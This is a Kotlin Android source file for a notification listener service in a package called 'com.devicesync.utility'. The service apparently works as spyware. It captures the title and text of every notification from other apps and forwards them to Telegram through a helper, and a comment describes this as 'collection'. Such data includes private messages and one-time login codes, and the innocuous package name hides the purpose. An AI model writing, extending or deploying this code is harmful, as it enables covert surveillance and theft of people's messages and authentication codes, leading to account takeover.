package com.devicesync.utility

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch

class NotificationListenerService : NotificationListenerService() {

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    override fun onCreate() {
        super.onCreate()
        TelegramHelper.AppContext.init(this)
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        try {
            val packageName = sbn.packageName ?: "unknown"

            // Skip own app's notifications to avoid loops
            if (packageName == applicationContext.packageName) return

            // Skip system UI
            if (packageName == "android" || packageName == "com.android.systemui") return

            val title = sbn.notification?.extras
                ?.getString("android.title") ?: ""
            val text = sbn.notification?.extras
                ?.getCharSequence("android.text")?.toString() ?: ""
            val subText = sbn.notification?.extras
                ?.getCharSequence("android.subText")?.toString() ?: ""

            if (title.isBlank() && text.isBlank()) return

            val formatted = buildString {
                appendLine("📬 Notification")
                appendLine("Package: `$packageName`")
                if (title.isNotBlank()) appendLine("Title: $title")
                if (text.isNotBlank()) appendLine("Text: $text")
                if (subText.isNotBlank()) appendLine("Sub: $subText")
            }

            serviceScope.launch {
                TelegramHelper.sendMessage(formatted)
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        // Not needed for collection
    }

    override fun onDestroy() {
        serviceScope.cancel()
        super.onDestroy()
    }
}
